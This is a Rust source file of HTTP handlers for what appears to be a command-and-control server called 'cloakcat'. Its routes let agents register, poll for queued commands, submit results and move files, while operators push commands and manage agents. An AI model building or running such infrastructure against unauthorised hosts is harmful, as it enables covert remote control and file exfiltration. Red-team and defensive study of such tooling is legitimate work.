//! Thin HTTP handlers — extract params, delegate to service, format response.

use axum::{
    body::Bytes,
    extract::{OriginalUri, Path, Query, State},
    http::{HeaderMap, StatusCode},
    response::IntoResponse,
    Json,
};
use serde::Deserialize;

use cloakcat_protocol::{FileChunk, TaskType};

use crate::error::ServerError;
use crate::service;
use crate::state::AppState;
use crate::validation::validate_profile;

// ========== Request/Query types ==========

#[derive(Deserialize)]
pub struct PushCmdReq {
    pub command: String,
    #[serde(default)]
    pub task_type: TaskType,
}

#[derive(Deserialize)]
pub struct UploadChunkReq {
    pub transfer_id: String,
    pub path: String,
    pub seq: u32,
    pub total: u32,
    /// Base64-encoded chunk bytes.
    pub data: String,
}

#[derive(Deserialize)]
pub struct UpdateAliasReq {
    pub alias: Option<String>,
    pub note: Option<String>,
}

#[derive(Deserialize)]
pub struct HoldParam {
    pub hold: Option<u64>,
}

#[derive(Deserialize)]
pub struct ListResults {
    pub agent_id: Option<String>,
    pub limit: Option<usize>,
}

#[derive(Deserialize)]
pub struct ListAudit {
    pub actor: Option<String>,
    pub agent_id: Option<String>,
    pub limit: Option<i64>,
}

#[derive(Deserialize)]
pub struct TagsPayload {
    #[serde(default)]
    pub tags: Vec<String>,
}

// ========== Agent routes (X-Agent-Token validated by agent_auth middleware) ==========

pub async fn ping_handler() -> &'static str {
    "pong"
}

pub async fn register_handler(
    OriginalUri(uri): OriginalUri,
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(payload): Json<cloakcat_protocol::RegisterReq>,
) -> Result<Json<serde_json::Value>, ServerError> {
    // If agent already exists, validate profile match
    if let Ok(agent) = service::get_agent(&state, &payload.agent_id).await {
        validate_profile(agent.profile_name.as_deref(), uri.path(), &headers)?;
    }

    let resp = service::register_agent(&state, &payload).await?;
    Ok(Json(resp))
}

pub async fn poll_handler(
    Path(agent_id): Path<String>,
    OriginalUri(uri): OriginalUri,
    headers: HeaderMap,
    State(state): State<AppState>,
    Query(q): Query<HoldParam>,
) -> Result<impl IntoResponse, ServerError> {
    let agent = service::get_agent(&state, &agent_id).await?;
    validate_profile(agent.profile_name.as_deref(), uri.path(), &headers)?;

    let hold = q.hold.unwrap_or(0);
    match service::poll_command(&state, &agent_id, hold).await? {
        Some(cmd) => Ok((
            StatusCode::OK,
            Json(serde_json::to_value(cmd).unwrap()),
        )),
        None => Ok((
            StatusCode::NO_CONTENT,
            Json(serde_json::json!({})),
        )),
    }
}

pub async fn result_handler(
    Path(agent_id): Path<String>,
    OriginalUri(uri): OriginalUri,
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(req): Json<cloakcat_protocol::ResultReq>,
) -> Result<Json<serde_json::Value>, ServerError> {
    let agent = service::get_agent(&state, &agent_id).await?;
    validate_profile(agent.profile_name.as_deref(), uri.path(), &headers)?;

    service::submit_result(&state, &agent, &req).await?;
    Ok(Json(serde_json::json!({ "status": "ok" })))
}

// ========== Protected (operator) routes ==========

pub async fn admin_agents(
    State(state): State<AppState>,
) -> Result<Json<Vec<cloakcat_protocol::AgentView>>, ServerError> {
    let agents = service::list_agents(&state).await?;
    Ok(Json(agents))
}

pub async fn admin_update_agent_alias(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Json(body): Json<UpdateAliasReq>,
) -> Result<Json<serde_json::Value>, ServerError> {
    let view = service::update_alias(
        &state,
        &agent_id,
        body.alias.as_deref(),
        body.note.as_deref(),
    )
    .await?;
    Ok(Json(serde_json::to_value(view).unwrap()))
}

pub async fn admin_results(
    State(state): State<AppState>,
    Query(q): Query<ListResults>,
) -> Result<Json<Vec<cloakcat_protocol::ResultView>>, ServerError> {
    let limit = q.limit.unwrap_or(20).min(200) as i64;
    let results = service::query_results(&state, q.agent_id.as_deref(), limit).await?;
    Ok(Json(results))
}

pub async fn admin_audit(
    State(state): State<AppState>,
    Query(q): Query<ListAudit>,
) -> Result<Json<Vec<crate::db::AuditRecord>>, ServerError> {
    let limit = q.limit.unwrap_or(50).max(1);
    let records = service::query_audit(
        &state,
        limit,
        q.actor.as_deref(),
        q.agent_id.as_deref(),
    )
    .await?;
    Ok(Json(records))
}

pub async fn admin_agent_tags(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
) -> Result<Json<serde_json::Value>, ServerError> {
    let tags = service::get_agent_tags(&state, &agent_id).await?;
    Ok(Json(serde_json::json!({ "tags": tags })))
}

pub async fn admin_set_agent_tags(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Json(body): Json<TagsPayload>,
) -> Result<Json<serde_json::Value>, ServerError> {
    let tags = service::set_agent_tags(&state, &agent_id, &body.tags).await?;
    Ok(Json(serde_json::json!({ "tags": tags })))
}

pub async fn push_command_handler(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Json(req): Json<PushCmdReq>,
) -> Result<Json<serde_json::Value>, ServerError> {
    service::push_command(&state, &agent_id, &req.command, req.task_type).await?;
    Ok(Json(serde_json::json!({ "status": "ok" })))
}

// ========== Transfer routes (operator-facing) ==========

/// POST /v1/transfer/upload-chunk/{agent_id} — CLI sends a file chunk to server.
pub async fn upload_chunk_handler(
    Path(agent_id): Path<String>,
    State(state): State<AppState>,
    Json(req): Json<UploadChunkReq>,
) -> Result<Json<serde_json::Value>, ServerError> {
    let complete = service::receive_upload_chunk(
        &state,
        &agent_id,
        &req.transfer_id,
        &req.path,
        req.seq,
        req.total,
        &req.data,
    )
    .await?;
    Ok(Json(serde_json::json!({ "status": "ok", "complete": complete })))
}

/// GET /v1/transfer/download-result/{transfer_id} — CLI polls for assembled download.
/// Returns 200 + raw bytes when ready, 202 when still in progress.
pub async fn get_download_handler(
    Path(transfer_id): Path<String>,
    State(state): State<AppState>,
) -> Result<impl IntoResponse, ServerError> {
    match service::get_download_bytes(&state, &transfer_id).await? {
        Some(bytes) => Ok((StatusCode::OK, Bytes::from(bytes)).into_response()),
        None => Ok((StatusCode::ACCEPTED, Json(serde_json::json!({ "status": "pending" }))).into_response()),
    }
}

// ========== Transfer routes (agent-facing) ==========

/// GET /v1/transfer/upload-file/{transfer_id} — agent fetches assembled upload file.
pub async fn get_upload_file_handler(
    Path(transfer_id): Path<String>,
    State(state): State<AppState>,
) -> Result<impl IntoResponse, ServerError> {
    let bytes = service::get_upload_bytes(&state, &transfer_id).await?;
    Ok((StatusCode::OK, Bytes::from(bytes)).into_response())
}

/// POST /v1/transfer/download-chunk/{agent_id} — agent sends a download chunk.
pub async fn download_chunk_handler(
    Path(_agent_id): Path<String>,
    State(state): State<AppState>,
    Json(chunk): Json<FileChunk>,
) -> Result<Json<serde_json::Value>, ServerError> {
    let complete = service::receive_download_chunk(&state, &chunk).await?;
    Ok(Json(serde_json::json!({ "status": "ok", "complete": complete })))
}
